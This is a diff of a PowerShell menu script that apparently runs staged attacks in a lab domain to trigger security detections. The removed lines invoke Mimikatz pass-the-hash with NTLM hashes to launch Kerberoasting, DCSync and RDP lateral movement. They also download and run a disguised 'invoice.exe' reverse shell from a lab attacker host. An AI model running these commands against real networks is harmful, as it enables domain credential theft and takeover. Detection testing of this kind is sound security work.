-                & $mimiExe "privilege::debug" "sekurlsa::pth /user:clark.monroe /domain:$env:ENV_DOMAIN /ntlm:$clarkHash /run:$idpDir\run_kerberoast.bat" "exit"
+            $editVar = Read-Host "  Enter variable name to change (or Enter to go back)"
+            if ($editVar -and $editVar -match '^ENV_') {
+                $newVal = Read-Host "  New value for $editVar"
+                if ($newVal) {
+                    Set-Item -Path "env:$editVar" -Value $newVal
+                    Write-Host "  [+] $editVar = $newVal" -ForegroundColor Green
+                    @("ENV_DC_IP=$env:ENV_DC_IP", "ENV_DT=$env:ENV_DT", "ENV_FORTI_IP=$env:ENV_FORTI_IP", "ENV_UBUNTU=$env:ENV_UBUNTU", "ENV_DOMAIN=$env:ENV_DOMAIN") | Out-File -FilePath $ipConfigFile -Encoding ASCII
+                    Write-Host "  [+] Saved to $ipConfigFile" -ForegroundColor Green
+                }
             }
         }
 
-        '8' {
-            Clear-Host
-            Write-Host "[Step 8] PtH svc_runbook -> DCSync" -ForegroundColor Cyan
-            Write-Host "         Using svc_runbook NTLM hash for Pass-the-Hash..." -ForegroundColor Gray
-            Write-Host "         Triggers: PassTheHash, StaleAccount, DCSync" -ForegroundColor Yellow
-            Write-Host
-
-            $svcHash = Get-SvcRunbookHash
-            if (-not $svcHash) {
-                $svcHash = Read-Host "  Enter svc_runbook NTLM hash"
-            }
-
-            if (-not $svcHash -or $svcHash.Length -ne 32) {
-                Write-Host "[!] Invalid hash. Run Step 6 first." -ForegroundColor Red
-            } else {
-                Write-Host "  User:   svc_runbook" -ForegroundColor White
-                Write-Host "  Domain: $env:ENV_DOMAIN" -ForegroundColor White
-                Write-Host "  NTLM:   $svcHash" -ForegroundColor White
-                Write-Host
-
-                Start-Process -FilePath "cmd.exe" -ArgumentList "/k `"$mimiExe`" `"privilege::debug`" `"sekurlsa::pth /user:svc_runbook /domain:$env:ENV_DOMAIN /ntlm:$svcHash /run:c:\IDP_Files\Post_PtH_DCSync.bat`""
-
-                Write-Host "[+] PtH launched - DCSync should execute in new window." -ForegroundColor Green
-            }
-        }
-
-        '9' {
-            Clear-Host
-            Write-Host "[Step 9] PtH svc_runbook -> RDP to BL" -ForegroundColor Cyan
-            Write-Host "         Lateral movement to managed host (Falcon EDR)..." -ForegroundColor Gray
-            Write-Host "         Triggers: PassTheHash (Identity) + lateral movement (EDR on BL)" -ForegroundColor Yellow
-            Write-Host
-
-            $svcHash = Get-SvcRunbookHash
-            if (-not $svcHash) {
-                $svcHash = Read-Host "  Enter svc_runbook NTLM hash"
-            }
-
-            if (-not $svcHash -or $svcHash.Length -ne 32) {
-                Write-Host "[!] Invalid hash. Run Step 6 first." -ForegroundColor Red
-            } else {
-                Write-Host "  User:   svc_runbook" -ForegroundColor White
-                Write-Host "  Domain: $env:ENV_DOMAIN" -ForegroundColor White
-                Write-Host "  NTLM:   $svcHash" -ForegroundColor White
-                Write-Host "  Target: $env:ENV_BL (BL)" -ForegroundColor White
-                Write-Host
-
-                # Create batch launcher for RDP
-                "mstsc /v:$env:ENV_BL" | Out-File -FilePath "$idpDir\run_rdp_bl.bat" -Encoding ASCII
-
-                Start-Process -FilePath "cmd.exe" -ArgumentList "/k `"$mimiExe`" `"privilege::debug`" `"sekurlsa::pth /user:svc_runbook /domain:$env:ENV_DOMAIN /ntlm:$svcHash /run:$idpDir\run_rdp_bl.bat`""
-
-                Write-Host "[+] PtH launched - RDP window should open to BL." -ForegroundColor Green
-            }
-        }
-
-        '0' {
-            Clear-Host
-            Write-Host "[Step 0] Download & execute reverse shell" -ForegroundColor Cyan
-            Write-Host "         Make sure listener is running on attacker host first!" -ForegroundColor Yellow
-            Write-Host
-
-            Invoke-WebRequest -Uri "http://attacker.lab.local/invoice.exe" -OutFile "$idpDir\invoice.exe" -UseBasicParsing
-            & "$idpDir\invoice.exe"
+        'c' {
+            # Handle lowercase c
+            $selection = 'C'
+            continue
         }
 
         'q' { return }
